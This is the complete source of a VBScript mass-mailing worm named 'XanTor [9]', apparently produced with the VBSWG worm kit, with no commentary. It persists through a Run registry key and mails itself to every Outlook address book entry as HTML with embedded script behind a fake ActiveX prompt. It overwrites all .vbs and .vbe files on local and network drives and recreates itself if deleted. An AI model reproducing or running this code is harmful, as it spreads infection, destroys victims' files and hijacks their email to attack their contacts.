'Vbs.-=)XanTor(=- [9] Created By -=)XanTor(=-
On Error Resume Next
Set t4PcoWlpiIz= Createobject("scripting.filesystemobject")
if not(t4PcoWlpiIz.fileexists("d:\worms")) then
t4PcoWlpiIz.createfolder "d:\worms"
end if
t4PcoWlpiIz.copyfile wscript.scriptfullname,"d:\worms\XanTor9.vbs"
Set k8Q4v076K51 = CreateObject("WScript.Shell")
k8Q4v076K51.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XanTor","wscript.exe d:\worms\XanTor9.vbs %"
if k8Q4v076K51.regread ("HKCU\software\-=)XanTor(=- [9]\mailed") <> "1" then
xN3KvIk67cV()
end if
N8lWQL0x9dc()
Set E6lOOD6TAI7= t4PcoWlpiIz.opentextfile(wscript.scriptfullname, 1)
Yi84nN065Ax= E6lOOD6TAI7.readall
E6lOOD6TAI7.Close
Do
If Not (t4PcoWlpiIz.fileexists(wscript.scriptfullname)) Then
Set xybTzbQ7548= t4PcoWlpiIz.createtextfile(wscript.scriptfullname, True)
xybTzbQ7548.writeYi84nN065Ax
xybTzbQ7548.Close
End If
Loop
Function xN3KvIk67cV()
On Error Resume Next
Set ni6F9E51kzq= CreateObject("Outlook.Application")
If ni6F9E51kzq = "Outlook" Then
Set NW4q3B64GrV= t4PcoWlpiIz.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While NW4q3B64GrV.atendofstream = False
M47QLNa4Y0v= NW4q3B64GrV.readline
RTBRa90tL75= RTBRa90tL75& Chr(34) & " & vbcrlf & " & Chr(34) & replace(M47QLNa4Y0v, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
NW4q3B64GrV.close
c049uGNW9SS = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
c049uGNW9SS = c049uGNW9SS& vbCrLf & "On Error Resume Next"
c049uGNW9SS = c049uGNW9SS & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
c049uGNW9SS = c049uGNW9SS & vbCrLf & "If Err.Number <> 0 Then"
c049uGNW9SS = c049uGNW9SS & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
c049uGNW9SS = c049uGNW9SS & vbCrLf & "Else"
c049uGNW9SS = c049uGNW9SS & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\XanTor9.vbs" & Chr(34) & ", True)"
c049uGNW9SS = c049uGNW9SS & vbCrLf & "vbs.write " & Chr(34) & RTBRa90tL75& Chr(34)
c049uGNW9SS = c049uGNW9SS & vbCrLf & "vbs.Close"
c049uGNW9SS = c049uGNW9SS & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
c049uGNW9SS = c049uGNW9SS & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\XanTor9.vbs %" & Chr(34) & ""
OIE4BWYjPJ8 = OIE4BWYjPJ8& vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
OIE4BWYjPJ8 = OIE4BWYjPJ8& vbCrLf & "End If"
OIE4BWYjPJ8 = OIE4BWYjPJ8 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
fWsnq8YG9g1=c049uGNW9SS & OIE4BWYjPJ8
Set vY3392GtjZ0 = ni6F9E51kzq.GetNameSpace("MAPI")
For Each Xs120f94P0E In vY3392GtjZ0.AddressLists
If Xs120f94P0E.AddressEntries.Count <> 0 Then
Mnmu9iipHTd= Xs120f94P0E.AddressEntries.Count
Set lh2ZH3xk60J= ni6F9E51kzq.CreateItem(0)
lh2ZH3xk60J.Subject = "XanTor is here!"
lh2ZH3xk60J.HTMLBody = fWsnq8YG9g1
lh2ZH3xk60J.DeleteAfterSubmit = True
For nfMl47jBOJT = 1 To Mnmu9iipHTd
Set YcBz08k7T7e= Xs120f94P0E.AddressEntries(nfMl47jBOJT)
If Mnmu9iipHTd= 1 Then
lh2ZH3xk60J.BCC = YcBz08k7T7e.Address
Else
lh2ZH3xk60J.BCC = lh2ZH3xk60J.BCC & "; " & YcBz08k7T7e.Address
End If
Next
lh2ZH3xk60J.send
End If
Next
k8Q4v076K51.regwrite "HKCU\software\-=)XanTor(=- [9]\mailed", "1"
ni6F9E51kzq.Quit
end if
End Function
Function N8lWQL0x9dc()
On Error Resume Next
Set Rl211ge33L9 = t4PcoWlpiIz.Drives
For Each S89Vb3zRfaO In Rl211ge33L9
If S89Vb3zRfaO.Drivetype = Remote Then
NBD4ygxw1JE= S89Vb3zRfaO & "\"
Call i72b483v3ZO(NBD4ygxw1JE)
ElseIf S89Vb3zRfaO.IsReady Then
NBD4ygxw1JE= S89Vb3zRfaO&"\"
Call i72b483v3ZO(NBD4ygxw1JE)
End If
Next
End Function
Function i72b483v3ZO(iE4BWYjPJ80)
y3392GtjZ09=iE4BWYjPJ80
Set wsnq8YG9g10= t4PcoWlpiIz.GetFolder(y3392GtjZ09)
Set v120f94P0EM= wsnq8YG9g10.Files
For Each smu9iipHTdl In v120f94P0EM
if t4PcoWlpiIz.GetExtensionName(smu9iipHTdl.path) = "vbs" then
t4PcoWlpiIz.copyfile wscript.scriptfullname , smu9iipHTdl.path , true
end if
if t4PcoWlpiIz.GetExtensionName(smu9iipHTdl.path) = "vbe" then
t4PcoWlpiIz.copyfile wscript.scriptfullname , smu9iipHTdl.path , true
end if
Next
Set smu9iipHTdl= wsnq8YG9g10.SubFolders
For Each b2ZH3xk60Jn In smu9iipHTdl
Call i72b483v3ZO(b2ZH3xk60Jn.path)
Next
End Function
'Vbswg 1.5. [K]Alamar.